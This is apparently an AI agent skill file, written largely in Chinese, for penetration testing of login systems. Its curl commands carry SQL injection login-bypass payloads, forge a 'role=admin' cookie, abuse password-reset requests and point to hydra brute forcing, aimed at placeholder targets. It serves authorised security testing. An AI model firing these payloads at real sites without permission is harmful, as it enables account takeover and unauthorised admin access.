---
name: auth-bypass
description: >-
  Tests authentication and session flaws—SQLi login bypass, default creds, JWT/session
  fixation, password reset logic, and captcha weaknesses—with proof logins in runs/.
  Use when user mentions 登录绕过/弱口令后台/验证码/会话/越权登录/admin bypass.
whenToUse: 存在登录口、密码重置、注册逻辑，或已拿到低权账号需提权到 admin
role: exploit
enabled: true
---

# 认证绕过（登录 / 会话 / 逻辑）

## 标准流程

### 1. 信息收集

```bash
mkdir -p runs/auth-TARGET
curl -s "http://TARGET/login" -o runs/auth-TARGET/login.html
grep -iE 'form|action|csrf|token|captcha' runs/auth-TARGET/login.html
```

### 2. SQLi 登录绕过（与 sqli-testing 配合）

```bash
curl -s -X POST "http://TARGET/login" \
  -d "username=admin' OR '1'='1'-- -&password=x" -o runs/auth-TARGET/sqli-login.txt
curl -s -X POST "http://TARGET/login" \
  -d "username=admin'/*&password=*/OR/**/1=1-- -" -o runs/auth-TARGET/sqli-login2.txt
```

### 3. 默认口令 / 弱口令

→ `credential-attack`（hydra http-post-form，**失败特征串先手工确认**）

### 4. 会话与逻辑

```bash
# 固定 Session / 改 Cookie role
curl -s -H "Cookie: role=user" "http://TARGET/admin" -o runs/auth-TARGET/cookie-role.txt
curl -s -H "Cookie: role=admin" "http://TARGET/admin" -o runs/auth-TARGET/cookie-admin.txt

# 密码重置：改邮箱/用户 ID/token 重用
curl -s -X POST "http://TARGET/reset" -d "email=victim@lab.local" -o runs/auth-TARGET/reset.txt
```

### 5. 验证码

- 固定码、空验证码、可爆破 4 位数字（**限次**）
- 复杂验证码 → `browser-automation`

### 6. 证明登录成功

**必须**：`browser-automation` 或 curl 带 Set-Cookie 访问后台独有 URL（如 `/admin/dashboard`）

## 与其它技能的分工

| 场景 | 技能 |
|---|---|
| 爆破 | `credential-attack` |
| API JWT | `api-security` |
| 后台路径 | `dir-bruteforce` |

## 输出与落库

1. `redteam_vuln_add` — type=`auth-bypass`, method, session_proof
2. `redteam_chain_add` — 成功登录请求 + 后台 URL 200 证据

## 纪律

1. 只有凭据不算完成——要后台页面或 API 200
2. 不锁死目标账号；hydra 用 `-t 4 -f`
